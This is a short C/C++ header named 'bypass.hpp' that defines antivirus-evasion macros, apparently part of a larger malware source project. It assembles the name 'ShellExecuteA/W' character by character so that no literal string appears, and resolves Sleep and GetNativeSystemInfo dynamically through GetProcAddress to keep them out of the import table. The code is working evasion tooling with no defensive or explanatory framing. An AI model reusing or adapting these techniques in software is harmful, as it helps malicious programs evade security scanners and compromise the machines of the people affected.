// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#ifndef __INC_BYPASS_HPP__
#define __INC_BYPASS_HPP__

typedef HINSTANCE (*__tShellExecute)(HWND, LPCTSTR, LPCTSTR, LPCTSTR, LPCTSTR, INT);

#ifndef UNICODE
#define AV_BYPASS__ShellExecute(p) \
{ \
	(p)[0] = 'S'; \
	(p)[1] = 'h'; \
	(p)[2] = 'e'; \
	(p)[3] = 'l'; \
	(p)[4] = 'l'; \
	(p)[5] = 'E'; \
	(p)[6] = 'x'; \
	(p)[7] = 'e'; \
	(p)[8] = 'c'; \
	(p)[9] = 'u'; \
	(p)[10] = 't'; \
	(p)[11] = 'e'; \
	(p)[12] = 'A'; \
	(p)[13] = '\0'; \
}
#else // !UNICODE
#define AV_BYPASS__ShellExecute(p) \
{ \
	(p)[0] = 'S'; \
	(p)[1] = 'h'; \
	(p)[2] = 'e'; \
	(p)[3] = 'l'; \
	(p)[4] = 'l'; \
	(p)[5] = 'E'; \
	(p)[6] = 'x'; \
	(p)[7] = 'e'; \
	(p)[8] = 'c'; \
	(p)[9] = 'u'; \
	(p)[10] = 't'; \
	(p)[11] = 'e'; \
	(p)[12] = 'W'; \
	(p)[13] = '\0'; \
}
#endif // !UNICODE

typedef void (WINAPI *__tGetNativeSystemInfo)(LPSYSTEM_INFO);
#define AV_BYPASS__GetNativeSystemInfo(p) \
{ \
	(p) = (__tGetNativeSystemInfo)GetProcAddress( \
		GetModuleHandle("kernel32.dll"), \
		"GetNativeSystemInfo" \
	); \
}

typedef VOID (WINAPI *__tSleep)(DWORD);
#define AV_BYPASS__Sleep(s) \
{ \
	__tSleep lpfnSleep = (__tSleep)GetProcAddress(LoadLibrary("kernel32.dll"), "Sleep"); \
	lpfnSleep(s); \
} \

#endif // __INC_BYPASS_HPP__